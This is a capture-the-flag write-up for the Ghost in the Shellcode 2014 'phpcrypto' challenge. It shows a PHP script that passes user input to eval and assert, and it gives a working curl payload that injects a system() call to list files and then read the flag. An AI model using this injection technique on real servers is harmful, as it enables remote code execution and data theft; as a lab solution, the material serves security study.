# Ghost in the Shellcode 2014: phpcrypto

**Category:** Recon
**Points:** 100
**Description:**

> GitS Presents [PHPCrypto 0.000001](http://phpcrypto.2014.ghostintheshellcode.com/)

## Write-up

The HTML source code of the linked page contains the following:

```js
function encrypt()
{
  key = $("#key")[0].value;
  plaintexthex = toHex($("#plaintext")[0].value);
  function success(data) {$("#ciphertext")[0].value = $.parseJSON(data).returnValue;}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":plaintexthex}, success );
}

function decrypt()
{
  key = $("#key")[0].value;
  ciphertext = $("#ciphertext")[0].value;
  function success(data) {$("#plaintext")[0].value = toAscii($.parseJSON(data).returnValue);}
  $.post('crypto.php', {"function":"customCrypto", "key":key, "plaintexthex":ciphertext}, success );
}
```

So, for encoding and decoding, a POST request is made to `/crypto.php` with the name of the function (`customCrypto`), the entered key, and the hexadecimal representation of the input text (for encoding) or the ciphertext (for decoding).

There’s also this comment:

```js
/*
TODO: add support for "help" and "dump" functions
*/
```

When using the `dump` function, the server returns an HTML document containing the syntax-highlighted source code of [the PHP script](https://github.com/ctfs/write-ups/blob/master/ghost-in-the-shellcode-2014/phpcrypto/source.php):

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=dump' > source.html
```

In some cases [the `customCrypto` function](https://github.com/ctfs/write-ups/blob/af43d4f482f869c9c3ba5a0c0bd88e57adf0f39e/ghost-in-the-shellcode-2014/phpcrypto/source.php#L68-L130) ends up in a code path where [`assert()`](http://php.net/assert) is executed:

```php
assert("\$message = \"ERROR! xorKey is: \".strlen(\$xorKey).\" bytes long and the plaintext is: \".strlen($plaintext).\" bytes long.\";");
```

`assert` is like `eval`, except it terminates script execution if the result is `false`. To get there, we need to pass the string `'true'` as the value for the third argument (`$DEBUG`).

That is possible because of this code:

```php
$params = $_POST;
unset($params['function']);

$param_string='';
foreach($params as $key=>$param)
{
    $param = preg_replace('/[^A-Za-z0-9]/','',$param);
    $param_string.=(($param_string)?',':'')."'".$param."'";
}

if (isset($DEBUG) && $DEBUG == "true") { error_log($_POST['function']."($param_string);"); }
eval("echo ".$_POST['function']."($param_string);");
```

All we need to do is use `DEBUG=true` (or `x=true` — the key doesn’t really matter) as the third key/value pair in the POST data, not counting the `function` parameter. This enables remote code execution:

```bash
$ echo -n '").system("ls");//' | xxd -p # will be used as the value for `plaintexthex`
22292e73797374656d28226c7322293b2f2f

$ curl http://phpcrypto.2014.ghostintheshellcode.com/crypto.php --data 'function=customCrypto&key=a&plaintexthex=22292e73797374656d28226c7322293b2f2f&DEBUG=true'
crypto.php
index.php
jquery-1.8.0.min.js
key
{"errorMsg":"The key is: ; and the plaintext is: key","returnValue":"1912154842484f5e56131957481912001414"}
```

Aha! There’s a file named `key`. Let’s see what it says:

```bash
$ curl http://phpcrypto.2014.ghostintheshellcode.com/key
ThisWasAStupidTestKeyThatBecameARealBoy
```

## Other write-ups and resources

* <http://tasteless.eu/2014/01/gits-2014-phpcrypto-recon-100/>
